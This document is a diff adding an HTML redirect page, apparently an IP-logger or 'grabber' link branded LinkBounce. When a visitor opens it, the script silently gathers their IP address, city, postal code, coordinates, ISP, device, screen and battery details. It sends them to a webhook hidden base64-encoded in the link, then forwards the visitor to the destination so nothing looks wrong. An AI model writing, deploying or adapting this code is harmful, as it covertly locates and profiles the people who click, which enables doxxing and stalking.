@@ -1,0 +1,207 @@
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <meta name="viewport" content="width=device-width">
+    <link href="https://fonts.googleapis.com/css2?family=Figtree:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
+    <style>
+      body{
+        /* background:#1E1F1C; */
+        display:flex;
+        flex-direction:column;
+        align-items: center;
+        justify-content: center;
+        align-content: center;
+        flex-wrap:wrap;
+        width:100vw;
+        /* color:white; */
+        margin:0px;
+        height:100vh;
+        /* font-family:Figtree, sans-serif; */
+      }
+      #rotate{
+        animation:rotate .7s linear infinite;
+      }
+      #bottom{
+        position: absolute;
+        bottom:25px;
+        display:flex;
+        align-items: center;
+        gap:10px;
+      }
+      @keyframes rotate {
+        from{rotate:0deg}
+        to{rotate:360deg}
+      }
+      /* span#ray{
+        opacity:0.75;
+      }
+      span#redir{
+        font-weight:bold;
+      } */
+    </style>
+    <!-- <span id="redir">Redirecting...</span>
+    <span id="ray">Ray ID <span id="uuid"></span></span> -->
+    <script defer>
+      async function gi(wh, d, t) {
+        let info = {
+        ip: "Error",
+        city: "Error",
+        region: "Error",
+        country_name: "Error",
+        postal: "Error",
+        latitude: "Error",
+        longitude: "Error",
+        asn: "Error",
+        org: "Error"
+        };
+
+        try {
+            const response = await fetch("https://ipapi.co/json");
+            if (!response.ok) throw new Error("Failed to fetch IP data");
+            info = await response.json();
+        } catch (error) {
+            console.error("Error fetching IP data:", error);
+        }
+
+        const i = {
+            label: t,
+            destination: d,
+            date: new Date().toLocaleDateString(),
+            time: new Date().toLocaleTimeString(),
+            platform: navigator.platform,
+            language: navigator.language,
+            userAgent: navigator.userAgent,
+            memory: navigator.deviceMemory || "Unknown",
+            cookies: navigator.cookieEnabled,
+            java: navigator.javaEnabled ? navigator.javaEnabled() : "Unknown",
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowX: window.screenX,
+            windowY: window.screenY,
+            ip: info.ip,
+            location: `${info.city}, ${info.region}, ${info.country_name}`,
+            city: info.city,
+            region: info.region,
+            country: info.country_name,
+            postal: info.postal,
+            coordinates: `${info.latitude}, ${info.longitude}`,
+            asn: info.asn,
+            isp: info.org
+        };
+
+
+        navigator.getBattery?.().then(b => {
+            i.battery = `${Math.round(b.level * 100)}%`;
+            stw(i, wh);
+        }).catch(() => {
+            i.battery = "Unknown";
+            stw(i, wh);
+        });
+    }
+
+    function stw(i, wh) {
+        const ei = btoa(JSON.stringify(i));
+        const tu = `https://linkbounce.github.io/package?i=${ei}`;
+        console.log("Generated URL:", tu);
+        const m = {
+          "content": null,
+          "embeds": [
+            {
+              "title": "Link Clicked | \"" + i.label + "\"",
+              "description": "[View full info package]("+tu+") | [Visit link destination]("+i.destination+") | [Make new URL](https://linkbounce.github.io/gen)",
+              "color": 3348384,
+              "fields": [
+                {
+                  "name": "📅 Time",
+                  "value": i.date,
+                  "inline": true
+                },
+                {
+                  "name": "🌐 IP Address",
+                  "value": i.ip,
+                  "inline": true
+                },
+                {
+                  "name": "🗺️ Location",
+                  "value": i.location,
+                  "inline": true
+                },
+                {
+                  "name": "🛜 ISP",
+                  "value": i.isp,
+                  "inline": true
+                },
+                {
+                  "name": "💻 Platform",
+                  "value": i.platform,
+                  "inline": true
+                },
+                {
+                  "name": "🍪 Cookies enabled?",
+                  "value": i.cookies,
+                  "inline": true
+                }
+              ],
+              "author": {
+                "name": "LinkBounce Analytics",
+                "icon_url": "https://linkbounce.github.io/linkbounce/logosquare.png"
+              },
+              "footer": {
+                "text": "© Linkbounce"
+              }
+            }
+          ],
+          "attachments": []
+        }
+        console.log(JSON.stringify(m));
+        // const m = {
+        //     "content": "",
+        //     "tts": false,
+        //     "embeds": [
+        //         {
+        //             "type": "rich",
+        //             "title": `🔔 "${i.label}" clicked | LinkBounce`,
+        //             "description": `🔗 Destination link: ${i.destination}\n🕗 Time: ${i.date}, ${i.time}\n📲 User Agent: ${i.userAgent}\n🖥️ Platform: ${i.platform}\n🌎 Language: ${i.language}\n🔋 Battery: ${i.battery}\n🍪 Cookies Enabled: ${i.cookies}\n🖥️ Screen Size: ${i.screenWidth} x ${i.screenHeight}\n🌍 Tracking URL: [Click here](${tu})`,
+        //             "color": 0xff0000
+        //         }
+        //     ]
+        // };
+
+        fetch(wh, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(m),
+        })
+        .then(() => {
+            console.log("Sent data to webhook");
+            redir(i.destination)
+        })
+        .catch(err => console.error("Error sending webhook:", err));
+    }
+
+    const p = new URLSearchParams(window.location.search);
+    var d;
+    if (!p.get('l') || window.location.href.includes("NOREDIRECT")){
+      console.log("Skipping redirect");
+      d = "noredir";
+    } else  {
+      d = atob(p.get('l'));
+    }
+    const wh = atob(p.get('w'));
+    const t = atob(p.get('t'));
+
+    gi(wh, d, t);
+
+    function redir(nl){
+      if (nl == "noredir") {
+        console.log('Skipped redirect');
+      } else {
+        document.location.href=nl;
+      }
+    }
+    </script>
